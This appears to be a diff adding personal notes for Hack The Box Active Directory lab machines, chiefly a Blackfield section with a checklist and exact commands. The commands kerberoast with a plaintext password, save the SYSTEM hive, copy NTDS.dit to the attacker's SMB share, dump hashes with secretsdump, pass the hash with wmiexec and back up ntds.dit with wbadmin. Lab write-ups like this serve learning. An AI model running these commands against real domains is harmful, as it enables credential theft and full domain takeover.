@@ -144,3 +144,54 @@ Kerberoasting
 GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
 
 
+# Blackfield:
+
+### **Things to Look For**:
+
+1. **AD Exploitation**:
+    
+    - Leverage Backup Operators or misconfigured permissions for privilege escalation.
+    - Target files like `NTDS.dit` and `SYSTEM` hive for domain-wide credential access.
+2. **Credential Handling**:
+    
+    - Always analyze dumped hashes with tools like `secretsdump.py`.
+3. **SMB Shares**:
+    
+    - Look for misconfigurations or sensitive files in shared directories.
+4. **Enumeration Focus**:
+    
+    - LDAP and Kerberos enumeration for AD environments.
+
+Leveraging Backup Operators group membership (SeBackup and SeRestore privileges)
+Dumping credentials for LSASS
+Anonymous / Guest Enumeration
+
+
+Enumeration:
+Nmap
+
+Foothold:
+SMBMAP
+Smbclient
+GetNPUsers
+
+Privilege Escalation:
+BloodHound
+Rpcclient
+lsass 
+ldapsearch
+Dumping Hashes with WBAdmin
+Robocopy
+Steal Ntds
+
+reg save HKLM\SYSTEM C:\system.hive
+
+cp ntds.dit \\10.10.14.3\smb\NTDS.dit
+cp system.hive \\10.10.14.3\smb\system.hive
+
+secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
+
+wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192
+
+wbadmin start backup -backuptarget:\\10.10.10.192\C$\Windows\Temp\CFX\ -include:c:\Windows\ntds\ntds.dit -quiet
+
